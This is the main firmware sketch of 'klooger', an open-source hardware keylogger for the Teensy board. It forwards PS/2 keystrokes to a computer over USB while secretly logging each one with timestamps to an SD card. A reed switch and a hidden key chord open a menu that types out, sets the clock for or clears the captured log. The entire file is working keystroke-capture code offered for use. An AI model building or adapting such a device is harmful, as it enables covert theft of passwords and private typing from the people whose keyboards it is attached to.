/*
 * klooger - a hardware keylogger based on the Teensy
 * Copyright (C) 2012 Michael Drost
 *
 * This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 3 of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty
 * of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along with this program; if not, see <http://www.gnu.org/licenses/>.
 */

//used by some other files has to be included in the main file
#include <SD.h>
#include <PS2NCS.h>
#include <Wire.h>

#include "Debug.h"
#include "FileOutput.h"
#include "Output.h"
#include "PS2Kbd.h"
#include "UsbKeyboardOutput.h"
#include "input.h"
#include "TestInput.h"
#include "ds1307.h"

// ##############################
// # Configure the Wiring on    #
// # the Board in the file      #
// ##############################
#include "Board.h"

// #################################
// # Create the used objects below #
// #################################
FileOutput fo;
UsbKeyboardOutput ko;
ds1307 rt;
PS2Kbd ki;

// #########################################
// # Set the pointer to use in the program #
// #########################################
// Output for every keystroke
Output* KeyboardOutput = &ko;
// LoggingOutput logs every keystroke. Is able to prit out the log
LoggingOutput* LoggerOutput = &fo;
// Keyboard input
Input* KeyboardInput = &ki;
// Real Time Clock
rtc* clock = &rt;

// ############
// # setup IO #
// ############
// This function is used to setup the created objects
void setupIO()
{
  fo.initialize();
  ki.initialize();
  rt.initialize();
}

// ####################
// # Normal Operation #
// ####################
//
// This function is called in each iteration of the normal loop function.
// as long as the Reed Contact isn't closed.
// So all the normal behavior of the Keyboard can be coded in this function.
//
// The following pointer are set and ready to use
// Output* LoggerOutput;
// Output* KeyboardOutput;
// Input* KeyboardInput;
// rtc* clock
// Also it is possible to use the function 
// void menu()
// to open the menu
void standardLoop()
{
  while(KeyboardInput->available())
  {
    LOGLN("Reading recieved Characters");
    char c = KeyboardInput->read();
    int modkeys = KeyboardInput->getModKeys();
    LOGLN("Writing the recieved Characters");
    KeyboardOutput->printKey(modkeys,c);
    LoggerOutput->printKey(modkeys,c);
  }
}

// ############################################################################################################################################################################
// #                                                                         The Program starts below                                                                         #
// ############################################################################################################################################################################
//
// In most cases it is not necessary to change this part of the Program.
// Please use setupIO() and standardLoop() instead.

#define CASENRKEY(n) case KEY_##n: case KEYPAD_##n: nr = n; KeyboardOutput->printKey(0, KEY_##n); break;

// the setup() method runs once, when the sketch starts
void setup() {
  // initialize the pin with teh Reed contact
  pinMode(PIN_F0, INPUT_PULLUP);
  IFLOG(
    pinMode(ledPin, OUTPUT);
    digitalWrite(ledPin, HIGH);   // set the LED on
    LOGLN("Starting Program")
    delay(5000);                  // wait for 5 seconds
    digitalWrite(ledPin, LOW);    // set the LED off
  )
  
  setupIO();

  LoggerOutput->prints("\nSTARTUP\n");
  LOGLN("Started Program");
}

int getNumber(unsigned char digits)
{
  unsigned int factor = 1;
  for(int i = 1; i < digits; ++i)
    factor*=10;
  int returnvalue = 0;
  char c;
  for(unsigned char i = 0 ;i < digits; ++i)
  {
    LOGLN("waiting for Keystroke");
    while(!KeyboardInput->available());
    unsigned char nr = 10;
    switch(c=KeyboardInput->read())
    {
      CASENRKEY(0)
      CASENRKEY(1)
      CASENRKEY(2)
      CASENRKEY(3)
      CASENRKEY(4)
      CASENRKEY(5)
      CASENRKEY(6)
      CASENRKEY(7)
      CASENRKEY(8)
      CASENRKEY(9)
      case KEY_BACKSPACE:
        if(i!=0)
        {
          i-=2;
          returnvalue /= 10;
          factor *= 10;
          KeyboardOutput->printKey(0, KEY_BACKSPACE);
        }
        continue;
    }
    LOG("read Keystroke ");
    LOGLN(nr);
    if(nr==10)
    {
      --i;
      continue;
    }
    
    returnvalue += factor*nr;
    factor /= 10;
  }
  LOG("gotNumber ");
  LOGLN(returnvalue);
  return returnvalue;
}

void inttochar(char* buffer, uint8_t length, uint8_t value)
{
  for(int i=0; i< length; ++i)
  {
    buffer[length-i-1] = '0' + (value%10);
    value = value / 10;
  }
}
void menu(){
     int exit = 0;
        while(!exit)
        {
          KeyboardOutput->printKey(MODIFIERKEY_CTRL, KEY_A);
          KeyboardOutput->printKey(0, KEY_DELETE);
          KeyboardOutput->prints("####################\n");
          KeyboardOutput->prints("### KLOOGER MENU ###\n");
          KeyboardOutput->prints("####################\n");
          KeyboardOutput->prints("\n");
          KeyboardOutput->prints("1 Set RTC\n");
          KeyboardOutput->prints("2 Print RTC\n");
          KeyboardOutput->prints("3 Print Log\n");
          KeyboardOutput->prints("4 Clear Log\n");
          KeyboardOutput->prints("0 End\n");
          KeyboardOutput->prints(">");
          
          uint8_t daym;
          uint8_t monthm;
          uint8_t yearm;
          uint8_t hourm;
          uint8_t minutem;
          uint8_t seconds;
          
          int nr = getNumber(1);
          KeyboardOutput->prints("\n\n"); 
          
          String time;
          char* str = "00.00.00 00:00:00";
          switch(nr)
          {
            case 1:
              KeyboardOutput->prints("Please enter todays date[01-31]>");
              daym = getNumber(2)%32;
              KeyboardOutput->prints("\nPlease enter todays month[01-12]>");
              monthm = getNumber(2)%13;
              KeyboardOutput->prints("\nPlease enter todays year 20[00-99]>");
              yearm = getNumber(2)%100;
              KeyboardOutput->prints("\nPlease enter the actual hour[00-23]>");
              hourm = getNumber(2)%24;
              KeyboardOutput->prints("\nPlease enter the actual minute[00-59]>");
              minutem = getNumber(2)%60;
              
              clock->settime(daym, monthm, yearm, hourm, minutem, 0);
              KeyboardOutput->prints("\nset clock to \n");
              /*break;//there is no break here to display the actual time afterwards*/
            case 2:
              clock->gettime(daym, monthm, yearm, hourm, minutem, seconds);
              
              inttochar(str, 2, daym);
              inttochar(str+3, 2, monthm);
              inttochar(str+6, 2, yearm);
              inttochar(str+9, 2, hourm);
              inttochar(str+12, 2, minutem);
              inttochar(str+15, 2, seconds);
              KeyboardOutput->prints(str);              
              KeyboardOutput->prints("\nany key to continue\n");
              while(!KeyboardInput->available());
              KeyboardInput->read();
              break;
            case 3:
              KeyboardOutput->prints("\nPress any Key to start typing the log.\nAfter the log is finished press any Key to get back to the menu");
              while(!KeyboardInput->available());
              KeyboardInput->read();
              LoggerOutput->printToOutput(KeyboardOutput);
              while(!KeyboardInput->available());
              KeyboardInput->read();
              break;
            case 4:
              LoggerOutput->clear();
              break;
            case 0:
              exit = 1;
              break;
          }
        }
      exit=0;
      KeyboardOutput->printKey(MODIFIERKEY_CTRL, KEY_A);
      KeyboardOutput->printKey(0, KEY_DELETE);

}

// the loop() method runs over and over again,
// as long as the board has power
// The following pointer are set and ready to use
// Output* LoggerOutput;
// Output* KeyboardOutput;
// Input* KeyboardInput;
void loop() {
  //Set the LEDs on the Keyboard
  KeyboardInput->setLedStatus(KeyboardOutput->getLedStatus());
  if(!digitalRead(PIN_F0))
  {
    while(KeyboardInput->available())
    {
      LOGLN("Reading recieved Characters - Menu Mode");
      char c = KeyboardInput->read();
      int modkeys = KeyboardInput->getModKeys();
      
      if(c==KEY_N && modkeys == (MODIFIERKEY_CTRL+MODIFIERKEY_ALT+MODIFIERKEY_GUI+MODIFIERKEY_SHIFT))
      {
        KeyboardInput->setLedStatus(7);
        while(c!=KEY_CAPS_LOCK){
          while(!KeyboardInput->available());
          char c = KeyboardInput->read();
          int modkeys = KeyboardInput->getModKeys();
          if(c==KEY_CAPS_LOCK)
            break;
          KeyboardOutput->printKey(modkeys,c);
          
        }
      }
      else if(c==KEY_K && modkeys == (MODIFIERKEY_CTRL+MODIFIERKEY_ALT+MODIFIERKEY_GUI+MODIFIERKEY_SHIFT))
      {
        menu();
      }
    }
  }
  else
  {
    standardLoop();
  }

  const unsigned long oneMinute = 3443327;
  const unsigned long maxn = 10 * oneMinute;
  static unsigned long n = maxn;
  if(n > maxn)
  {
    LOGLN("Writing RTC to File");
    n=0;
    uint8_t daym;
    uint8_t monthm;
    uint8_t yearm;
    uint8_t hourm;
    uint8_t minutem;
    uint8_t seconds;
    char* str = "00.00.00 00:00:00";
    
    clock->gettime(daym, monthm, yearm, hourm, minutem, seconds);
              
    inttochar(str, 2, daym);
    inttochar(str+3, 2, monthm);
    inttochar(str+6, 2, yearm);
    inttochar(str+9, 2, hourm);
    inttochar(str+12, 2, minutem);
    inttochar(str+15, 2, seconds);
    LoggerOutput->prints("\nTime NOW: ");
    LoggerOutput->prints(str);
    LoggerOutput->prints("\n");
  }
  n++;
}

